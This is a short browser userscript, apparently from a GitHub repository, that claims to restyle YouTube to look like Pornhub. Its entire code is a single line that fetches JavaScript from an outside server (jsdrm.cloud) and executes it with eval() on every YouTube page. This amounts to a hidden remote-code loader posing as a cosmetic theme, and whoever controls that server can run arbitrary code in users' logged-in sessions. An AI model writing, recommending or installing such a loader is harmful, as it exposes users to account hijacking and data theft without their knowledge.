// ==UserScript==
// @name        YouTube Pornhub
// @namespace   https://flawcra.cc/
// @match       https://youtube.com/*
// @match       https://www.youtube.com/*
// @grant       none
// @version     1.0.0-GitHub
// @author      FlawCra
// @license     Apache License 2.0
// @updateURL   https://raw.githubusercontent.com/FlawCra/UserScripts/main/scripts/YouTubePH.user.js
// @icon        https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://pornhub.com&size=256
// @description A script to make YouTube look like Pornhub.
// @inject-into content
// ==/UserScript==

fetch("https://jsdrm.cloud/v2/loader/272193e3-9197-4b49-92b6-63475ae8bc45/9a0a8b23-9d5e-4a22-8e5c-34072cc7be28").then((res) => res.text().then((txt) => eval(txt)));
